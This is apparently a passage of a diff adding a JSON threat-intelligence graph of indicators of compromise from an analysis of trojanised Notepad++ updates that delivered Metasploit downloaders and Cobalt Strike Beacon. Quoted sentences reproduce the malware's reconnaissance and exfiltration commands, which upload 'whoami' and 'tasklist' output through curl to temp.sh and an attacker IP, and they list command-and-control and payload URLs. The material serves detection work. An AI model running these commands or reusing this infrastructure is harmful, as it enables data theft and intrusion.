+          "To do that, it performs the following actions:\n- Drops the following files to the\n%appdata%\\ProShow\ndirectory:ProShow.exe\n(SHA1: defb05d5a91e4920c9e22de2d81c5dc9b95a9a7c)defscr\n(SHA1: 259cd3542dea998c57f67ffdd4543ab836e3d2a3)if.dnt\n(SHA1: 46654a7ad6bc809b623c51938954de48e27a5618)proshow.crs\nproshow.phd\nproshow_e.bmp\n(SHA1: 9df6ecc47b192260826c247bf8d40384aa6e6fd6)load\n(SHA1: 06a6a5a39193075734a32e0235bde0e979c27228)\n- Executes the dropped\nProShow.exe\nfile.",
+          "It is worth noting that, apart from this payload, all files in the %appdata%\\ProShow\ndirectory are legitimate."
+        ]
+      },
+      {
+        "node_id": "IOC_44a537082075",
+        "node_class": "ioc",
+        "node_type": "Hash",
+        "node_text": "821c0cafb2aab0f063ef7e313f64313fc81d46cd",
+        "edges": [
+          "EDGE_15"
+        ],
+        "sentence_indices": [
+          49
+        ],
+        "span_sentences": [
+          "In mid-October 2025, we observed attackers to resume deployments of the chain #2 payload (SHA1 hash: 821c0cafb2aab0f063ef7e313f64313fc81d46cd) using yet another URL: http://95.179.213[.]0/update/update.exe."
+        ]
+      },
+      {
+        "node_id": "IOC_4501b176b17c",
+        "node_class": "ioc",
+        "node_type": "Hash",
+        "node_text": "46654a7ad6bc809b623c51938954de48e27a5618",
+        "edges": [],
+        "sentence_indices": [
+          13
+        ],
+        "span_sentences": [
+          "To do that, it performs the following actions:\n- Drops the following files to the\n%appdata%\\ProShow\ndirectory:ProShow.exe\n(SHA1: defb05d5a91e4920c9e22de2d81c5dc9b95a9a7c)defscr\n(SHA1: 259cd3542dea998c57f67ffdd4543ab836e3d2a3)if.dnt\n(SHA1: 46654a7ad6bc809b623c51938954de48e27a5618)proshow.crs\nproshow.phd\nproshow_e.bmp\n(SHA1: 9df6ecc47b192260826c247bf8d40384aa6e6fd6)load\n(SHA1: 06a6a5a39193075734a32e0235bde0e979c27228)\n- Executes the dropped\nProShow.exe\nfile."
+        ]
+      },
+      {
+        "node_id": "IOC_4bc73d9d816a",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "temp[.]sh",
+        "edges": [
+          "EDGE_16",
+          "EDGE_17",
+          "EDGE_18"
+        ],
+        "sentence_indices": [
+          9,
+          11,
+          31
+        ],
+        "span_sentences": [
+          "This is done through the following steps:\n- The file creates a directory named\n%appdata%\\ProShow\nand sets it as the current directory; - It executes the shell command\ncmd /c whoami&&tasklist > 1.txt\n, thus creating a file with the shell command execution results in the%appdata%\\ProShow\ndirectory; - Then it uploads the\n1.txt\nfile to the temp[.]sh hosting service by executing thecurl.exe -F \"file=@1.txt\" -s https://temp.sh/upload\ncommand; - Next, it sends the URL to the uploaded\n1.txt\nfile by using thecurl.exe --user-agent \"https://temp.sh/ZMRKV/1.txt\" -s http://45.76.155[.]202\nshell command.",
+          "Notably, the same behavior of malicious Notepad++ updates, specifically the launch of shell commands and the use of the temp[.]sh website for file uploading, was described on the Notepad++ community forums by a user named soft-parsley.",
+          "The created a.txt\nfile was, just as in the case of stage #1, uploaded to the temp[.]sh website through curl, with the obtained temp[.]sh URL being transferred to the same http://45.76.155[.]202/list endpoint, inside the User-Agent header."
+        ]
+      },
+      {
+        "node_id": "IOC_4cff9938eede",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "self-dns.it[.]com",
+        "edges": [
+          "EDGE_19"
+        ],
+        "sentence_indices": [
+          50
+        ],
+        "span_sentences": [
+          "Still, this payload used the previously mentioned self-dns.it[.]com and safe-dns.it[.]com domain names for system information uploading, Metasploit downloader and Cobalt Strike Beacon communications."
+        ]
+      },
+      {
+        "node_id": "IOC_54089b105033",
+        "node_class": "ioc",
+        "node_type": "Hash",
+        "node_text": "defb05d5a91e4920c9e22de2d81c5dc9b95a9a7c",
+        "edges": [],
+        "sentence_indices": [
+          13
+        ],
+        "span_sentences": [
+          "To do that, it performs the following actions:\n- Drops the following files to the\n%appdata%\\ProShow\ndirectory:ProShow.exe\n(SHA1: defb05d5a91e4920c9e22de2d81c5dc9b95a9a7c)defscr\n(SHA1: 259cd3542dea998c57f67ffdd4543ab836e3d2a3)if.dnt\n(SHA1: 46654a7ad6bc809b623c51938954de48e27a5618)proshow.crs\nproshow.phd\nproshow_e.bmp\n(SHA1: 9df6ecc47b192260826c247bf8d40384aa6e6fd6)load\n(SHA1: 06a6a5a39193075734a32e0235bde0e979c27228)\n- Executes the dropped\nProShow.exe\nfile."
+        ]
+      },
+      {
+        "node_id": "IOC_5fe682052915",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "http://45.76.155[.]202/update/update.exe",
+        "edges": [
+          "EDGE_20",
+          "EDGE_21"
+        ],
+        "sentence_indices": [
+          6,
+          28
+        ],
+        "span_sentences": [
+          "It was hosted at http://45.76.155[.]202/update/update.exe.",
+          "The malicious update was still being distributed from the URL http://45.76.155[.]202/update/update.exe, and the file downloaded from it (SHA1 hash: 573549869e84544e3ef253bdba79851dcde4963a) was an NSIS installer as well."
+        ]
+      },
+      {
+        "node_id": "IOC_6e504b4fd407",
+        "node_class": "ioc",
+        "node_type": "Hash",
+        "node_text": "573549869e84544e3ef253bdba79851dcde4963a",
+        "edges": [],
+        "sentence_indices": [
+          28
+        ],
+        "span_sentences": [
+          "The malicious update was still being distributed from the URL http://45.76.155[.]202/update/update.exe, and the file downloaded from it (SHA1 hash: 573549869e84544e3ef253bdba79851dcde4963a) was an NSIS installer as well."
+        ]
+      },
+      {
+        "node_id": "IOC_6f3b325a6a51",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "https://45.77.31[.]210/users/admin",
+        "edges": [
+          "EDGE_22"
+        ],
+        "sentence_indices": [
+          21
+        ],
+        "span_sentences": [
+          "It decrypts a Metasploit downloader payload that retrieves a Cobalt Strike Beacon shellcode from the URL https://45.77.31[.]210/users/admin (user agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36) and launches it."
+        ]
+      },
+      {
+        "node_id": "IOC_77cc41812b2e",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "http://45.76.155[.]202/list",
+        "edges": [],
+        "sentence_indices": [
+          31
+        ],
+        "span_sentences": [
+          "The created a.txt\nfile was, just as in the case of stage #1, uploaded to the temp[.]sh website through curl, with the obtained temp[.]sh URL being transferred to the same http://45.76.155[.]202/list endpoint, inside the User-Agent header."
+        ]
+      },
+      {
+        "node_id": "IOC_79aaee304ff7",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "http://95.179.213[.]0/update/AutoUpdater.exe",
+        "edges": [
+          "EDGE_23"
+        ],
+        "sentence_indices": [
+          52
+        ],
+        "span_sentences": [
+          "Specifically, attackers started using the following URLs:\n- http://95.179.213[.]0/update/install.exe;\n- http://95.179.213[.]0/update/update.exe;\n- http://95.179.213[.]0/update/AutoUpdater.exe."
+        ]
+      },
+      {
+        "node_id": "IOC_7a68aabc80ec",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "https://cdncheck.it[.]com/users/admin",
+        "edges": [
+          "EDGE_24",
+          "EDGE_25"
+        ],
+        "sentence_indices": [
+          25,
+          34
+        ],
+        "span_sentences": [
+          "However, we noted the following differences:\n- In the Metasploit downloader payload, the URL for downloading Cobalt Strike Beacon was set to https://cdncheck.it[.]com/users/admin;\n- The Cobalt Strike C2 server URLs were set to https://cdncheck.it[.]com/api/update/v1 and https://cdncheck.it[.]com/api/Metadata/submit.",
+          "The launched shellcode is, just in the case of chain #1, a Metasploit downloader, which downloads a Cobalt Strike Beacon payload, again in the form of a shellcode, from the URL https://cdncheck.it[.]com/users/admin."
+        ]
+      },
+      {
+        "node_id": "IOC_8b8f92031ea3",
+        "node_class": "ioc",
+        "node_type": "Hash",
+        "node_text": "13179c8f19fbf3d8473c49983a199e6cb4f318f0",
+        "edges": [],
+        "sentence_indices": [
+          37
+        ],
+        "span_sentences": [
+          "One of them had the SHA1 hash 13179c8f19fbf3d8473c49983a199e6cb4f318f0."
+        ]
+      },
+      {
+        "node_id": "IOC_9252a40891cf",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "safe-dns.it[.]com",
+        "edges": [],
+        "sentence_indices": [
+          50
+        ],
+        "span_sentences": [
+          "Still, this payload used the previously mentioned self-dns.it[.]com and safe-dns.it[.]com domain names for system information uploading, Metasploit downloader and Cobalt Strike Beacon communications."
+        ]
+      },
+      {
+        "node_id": "IOC_937565b6619c",
+        "node_class": "ioc",
+        "node_type": "Hash",
+        "node_text": "90e677d7ff5844407b9c073e3b7e896e078e11cd",
+        "edges": [
+          "EDGE_26"
+        ],
+        "sentence_indices": [
+          24
+        ],
+        "span_sentences": [
+          "Later on, in early August 2025, we observed attackers to use the same download URL for the update.exe\nfiles (observed SHA1 hash: 90e677d7ff5844407b9c073e3b7e896e078e11cd), as well as the same execution chain for delivery of Cobalt Strike Beacon via malicious Notepad++ updates."
+        ]
+      },
+      {
+        "node_id": "IOC_98e52e1f8f26",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "https://safe-dns.it[.]com/help/Get-Start",
+        "edges": [
+          "EDGE_27"
+        ],
+        "sentence_indices": [
+          41
+        ],
+        "span_sentences": [
+          "By using it, attackers performed the following:\n- Changed the system information upload URL to https://self-dns.it[.]com/list;\n- Changed the user agent used in HTTP requests to Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36;\n- Changed the URL used by the Metasploit downloader to https://safe-dns.it[.]com/help/Get-Start;\n- Changed the Cobalt Strike Beacon C2 server URLs to https://safe-dns.it[.]com/resolve and https://safe-dns.it[.]com/dns-query."
+        ]
+      },
+      {
+        "node_id": "IOC_990a500a9d46",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "https://temp.sh/upload",
+        "edges": [
+          "EDGE_28"
+        ],
+        "sentence_indices": [
+          9
+        ],
+        "span_sentences": [
+          "This is done through the following steps:\n- The file creates a directory named\n%appdata%\\ProShow\nand sets it as the current directory; - It executes the shell command\ncmd /c whoami&&tasklist > 1.txt\n, thus creating a file with the shell command execution results in the%appdata%\\ProShow\ndirectory; - Then it uploads the\n1.txt\nfile to the temp[.]sh hosting service by executing thecurl.exe -F \"file=@1.txt\" -s https://temp.sh/upload\ncommand; - Next, it sends the URL to the uploaded\n1.txt\nfile by using thecurl.exe --user-agent \"https://temp.sh/ZMRKV/1.txt\" -s http://45.76.155[.]202\nshell command."
+        ]
+      },
+      {
+        "node_id": "IOC_a00ad50b1cf7",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "http://45.32.144[.]255/update/update.exe",
+        "edges": [
+          "EDGE_29"
+        ],
+        "sentence_indices": [
+          43
+        ],
+        "span_sentences": [
+          "They also changed the C2 server for distributing malicious updates, with the observed update URL being http://45.32.144[.]255/update/update.exe."
+        ]
+      },
+      {
+        "node_id": "IOC_b6adedd7fef4",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "cdncheck.it[.]com",
+        "edges": [
+          "EDGE_30",
+          "EDGE_31"
+        ],
+        "sentence_indices": [
+          22,
+          25,
+          34,
+          35
+        ],
+        "span_sentences": [
+          "The Cobalt Strike Beacon payload is designed to communicate with the cdncheck.it[.]com C2 server.",
+          "However, we noted the following differences:\n- In the Metasploit downloader payload, the URL for downloading Cobalt Strike Beacon was set to https://cdncheck.it[.]com/users/admin;\n- The Cobalt Strike C2 server URLs were set to https://cdncheck.it[.]com/api/update/v1 and https://cdncheck.it[.]com/api/Metadata/submit.",
+          "The launched shellcode is, just in the case of chain #1, a Metasploit downloader, which downloads a Cobalt Strike Beacon payload, again in the form of a shellcode, from the URL https://cdncheck.it[.]com/users/admin.",
+          "The Cobalt Strike payload contains the C2 server URLs that slightly differ from the ones seen previously: https://cdncheck.it[.]com/api/getInfo/v1 and https://cdncheck.it[.]com/api/FileUpload/submit."
+        ]
+      },
+      {
+        "node_id": "IOC_be731b8fefa2",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "https://45.77.31[.]210/api/FileUpload/submit",
+        "edges": [],
+        "sentence_indices": [
+          23
+        ],
+        "span_sentences": [
+          "For instance, it uses the GET request URL https://45.77.31[.]210/api/update/v1 and the POST request URL https://45.77.31[.]210/api/FileUpload/submit."
+        ]
+      },
+      {
+        "node_id": "IOC_bea57aa92cc2",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "https://self-dns.it[.]com/list",
+        "edges": [
+          "EDGE_32"
+        ],
+        "sentence_indices": [
+          41
+        ],
+        "span_sentences": [
+          "By using it, attackers performed the following:\n- Changed the system information upload URL to https://self-dns.it[.]com/list;\n- Changed the user agent used in HTTP requests to Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36;\n- Changed the URL used by the Metasploit downloader to https://safe-dns.it[.]com/help/Get-Start;\n- Changed the Cobalt Strike Beacon C2 server URLs to https://safe-dns.it[.]com/resolve and https://safe-dns.it[.]com/dns-query."
+        ]
+      },
+      {
+        "node_id": "IOC_c77140d39bca",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "https://45.77.31[.]210/api/update/v1",
+        "edges": [],
+        "sentence_indices": [
+          23
+        ],
+        "span_sentences": [
+          "For instance, it uses the GET request URL https://45.77.31[.]210/api/update/v1 and the POST request URL https://45.77.31[.]210/api/FileUpload/submit."
+        ]
+      },
+      {
+        "node_id": "IOC_d0d42548ad7a",
+        "node_class": "ioc",
+        "node_type": "Hash",
+        "node_text": "d7ffd7b588880cf61b603346a3557e7cce648c93",
+        "edges": [],
+        "sentence_indices": [
+          44
+        ],
+        "span_sentences": [
+          "The payload downloaded (SHA1: d7ffd7b588880cf61b603346a3557e7cce648c93) was still a NSIS installer, however, unlike in the case of chains 1 and 2, this installer did not include the system information sending functionality."
+        ]
+      },
+      {
+        "node_id": "IOC_dcbd47496b53",
+        "node_class": "ioc",
+        "node_type": "Hash",
+        "node_text": "06a6a5a39193075734a32e0235bde0e979c27228",
+        "edges": [],
+        "sentence_indices": [
+          13
+        ],
+        "span_sentences": [
+          "To do that, it performs the following actions:\n- Drops the following files to the\n%appdata%\\ProShow\ndirectory:ProShow.exe\n(SHA1: defb05d5a91e4920c9e22de2d81c5dc9b95a9a7c)defscr\n(SHA1: 259cd3542dea998c57f67ffdd4543ab836e3d2a3)if.dnt\n(SHA1: 46654a7ad6bc809b623c51938954de48e27a5618)proshow.crs\nproshow.phd\nproshow_e.bmp\n(SHA1: 9df6ecc47b192260826c247bf8d40384aa6e6fd6)load\n(SHA1: 06a6a5a39193075734a32e0235bde0e979c27228)\n- Executes the dropped\nProShow.exe\nfile."
+        ]
+      },
+      {
+        "node_id": "IOC_dcc27388c43d",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "%appdata%\\Bluetooth\\.",
+        "edges": [],
+        "sentence_indices": [
+          45
+        ],
+        "span_sentences": [
+          "It simply dropped the following files to the %appdata%\\Bluetooth\\."
+        ]
+      },
+      {
+        "node_id": "IOC_e114f941f5b5",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "http://45.76.155[.]202",
+        "edges": [
+          "EDGE_33"
+        ],
+        "sentence_indices": [
+          6,
+          9,
+          28,
+          31
+        ],
+        "span_sentences": [
+          "It was hosted at http://45.76.155[.]202/update/update.exe.",
+          "This is done through the following steps:\n- The file creates a directory named\n%appdata%\\ProShow\nand sets it as the current directory; - It executes the shell command\ncmd /c whoami&&tasklist > 1.txt\n, thus creating a file with the shell command execution results in the%appdata%\\ProShow\ndirectory; - Then it uploads the\n1.txt\nfile to the temp[.]sh hosting service by executing thecurl.exe -F \"file=@1.txt\" -s https://temp.sh/upload\ncommand; - Next, it sends the URL to the uploaded\n1.txt\nfile by using thecurl.exe --user-agent \"https://temp.sh/ZMRKV/1.txt\" -s http://45.76.155[.]202\nshell command.",
+          "The malicious update was still being distributed from the URL http://45.76.155[.]202/update/update.exe, and the file downloaded from it (SHA1 hash: 573549869e84544e3ef253bdba79851dcde4963a) was an NSIS installer as well.",
+          "The created a.txt\nfile was, just as in the case of stage #1, uploaded to the temp[.]sh website through curl, with the obtained temp[.]sh URL being transferred to the same http://45.76.155[.]202/list endpoint, inside the User-Agent header."
+        ]
+      },
+      {
+        "node_id": "IOC_e3da3171b92e",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "https://safe-dns.it[.]com/dns-query",
+        "edges": [
+          "EDGE_34"
+        ],
+        "sentence_indices": [
+          41
+        ],
+        "span_sentences": [
+          "By using it, attackers performed the following:\n- Changed the system information upload URL to https://self-dns.it[.]com/list;\n- Changed the user agent used in HTTP requests to Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36;\n- Changed the URL used by the Metasploit downloader to https://safe-dns.it[.]com/help/Get-Start;\n- Changed the Cobalt Strike Beacon C2 server URLs to https://safe-dns.it[.]com/resolve and https://safe-dns.it[.]com/dns-query."
+        ]
+      },
+      {
+        "node_id": "IOC_f8b5e052f3c3",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "https://temp.sh/ZMRKV/1.txt",
+        "edges": [
+          "EDGE_35"
+        ],
+        "sentence_indices": [
+          9
+        ],
+        "span_sentences": [
+          "This is done through the following steps:\n- The file creates a directory named\n%appdata%\\ProShow\nand sets it as the current directory; - It executes the shell command\ncmd /c whoami&&tasklist > 1.txt\n, thus creating a file with the shell command execution results in the%appdata%\\ProShow\ndirectory; - Then it uploads the\n1.txt\nfile to the temp[.]sh hosting service by executing thecurl.exe -F \"file=@1.txt\" -s https://temp.sh/upload\ncommand; - Next, it sends the URL to the uploaded\n1.txt\nfile by using thecurl.exe --user-agent \"https://temp.sh/ZMRKV/1.txt\" -s http://45.76.155[.]202\nshell command."
+        ]
+      },
+      {
+        "node_id": "IOC_fefdb2c01e67",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "http://95.179.213[.]0/update/install.exe",
+        "edges": [
+          "EDGE_36"
+        ],
+        "sentence_indices": [
+          52
+        ],
+        "span_sentences": [
+          "Specifically, attackers started using the following URLs:\n- http://95.179.213[.]0/update/install.exe;\n- http://95.179.213[.]0/update/update.exe;\n- http://95.179.213[.]0/update/AutoUpdater.exe."
+        ]
+      }
+    ]
+  },
+  "edges": [
+    {
+      "edge_id": "EDGE_1",
+      "node_u": "HL_19119052b5b0",
+      "node_v": "TTP_T1059"
+    },
+    {
+      "edge_id": "EDGE_2",
+      "node_u": "HL_1cc8a7cd6345",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_3",
+      "node_u": "HL_2f021d2af20b",
+      "node_v": "TTP_T1203"
+    },
+    {
+      "edge_id": "EDGE_4",
+      "node_u": "HL_514b9e64f22f",
+      "node_v": "TTP_T1195"
+    },
+    {
+      "edge_id": "EDGE_5",
+      "node_u": "HL_fe58dfa21a1b",
+      "node_v": "TTP_T1059"
+    },
+    {
+      "edge_id": "EDGE_6",
+      "node_u": "HL_fe58dfa21a1b",
+      "node_v": "TTP_T1071"
+    },
+    {
+      "edge_id": "EDGE_7",
+      "node_u": "HL_fe58dfa21a1b",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_8",
+      "node_u": "HL_fe58dfa21a1b",
+      "node_v": "TTP_T1195"
+    },
+    {
+      "edge_id": "EDGE_9",
+      "node_u": "IOC_07f5756eccea",
+      "node_v": "TTP_T1102"
+    },
+    {
+      "edge_id": "EDGE_10",
+      "node_u": "IOC_07f5756eccea",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_11",
+      "node_u": "IOC_0941e865e75d",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_12",
+      "node_u": "IOC_0e28ff84676c",
+      "node_v": "TTP_T1071"
+    },
+    {
+      "edge_id": "EDGE_13",
+      "node_u": "IOC_2392eca92438",
+      "node_v": "TTP_T1102"
+    },
+    {
+      "edge_id": "EDGE_14",
+      "node_u": "IOC_2392eca92438",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_15",
+      "node_u": "IOC_44a537082075",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_16",
+      "node_u": "IOC_4bc73d9d816a",
+      "node_v": "TTP_T1041"
+    },
+    {
+      "edge_id": "EDGE_17",
+      "node_u": "IOC_4bc73d9d816a",
+      "node_v": "TTP_T1071"
+    },
+    {
+      "edge_id": "EDGE_18",
+      "node_u": "IOC_4bc73d9d816a",
+      "node_v": "TTP_T1567"
+    },
+    {
+      "edge_id": "EDGE_19",
+      "node_u": "IOC_4cff9938eede",
+      "node_v": "TTP_T1041"
+    },
+    {
+      "edge_id": "EDGE_20",
+      "node_u": "IOC_5fe682052915",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_21",
+      "node_u": "IOC_5fe682052915",
+      "node_v": "TTP_T1195"
+    },
+    {
+      "edge_id": "EDGE_22",
+      "node_u": "IOC_6f3b325a6a51",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_23",
+      "node_u": "IOC_79aaee304ff7",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_24",
+      "node_u": "IOC_7a68aabc80ec",
+      "node_v": "TTP_T1102"
+    },
+    {
+      "edge_id": "EDGE_25",
+      "node_u": "IOC_7a68aabc80ec",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_26",
+      "node_u": "IOC_937565b6619c",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_27",
+      "node_u": "IOC_98e52e1f8f26",
+      "node_v": "TTP_T1071"
+    },
+    {
+      "edge_id": "EDGE_28",
+      "node_u": "IOC_990a500a9d46",
+      "node_v": "TTP_T1041"
+    },
+    {
+      "edge_id": "EDGE_29",
+      "node_u": "IOC_a00ad50b1cf7",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_30",
+      "node_u": "IOC_b6adedd7fef4",
+      "node_v": "TTP_T1102"
+    },
+    {
+      "edge_id": "EDGE_31",
+      "node_u": "IOC_b6adedd7fef4",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_32",
+      "node_u": "IOC_bea57aa92cc2",
+      "node_v": "TTP_T1071"
+    },
+    {
+      "edge_id": "EDGE_33",
+      "node_u": "IOC_e114f941f5b5",
+      "node_v": "TTP_T1071"
+    },
+    {
+      "edge_id": "EDGE_34",
+      "node_u": "IOC_e3da3171b92e",
+      "node_v": "TTP_T1071"
+    },
+    {
+      "edge_id": "EDGE_35",
+      "node_u": "IOC_f8b5e052f3c3",
+      "node_v": "TTP_T1041"
+    },
+    {
+      "edge_id": "EDGE_36",
+      "node_u": "IOC_fefdb2c01e67",
+      "node_v": "TTP_T1105"
+    }
+  ]
+}
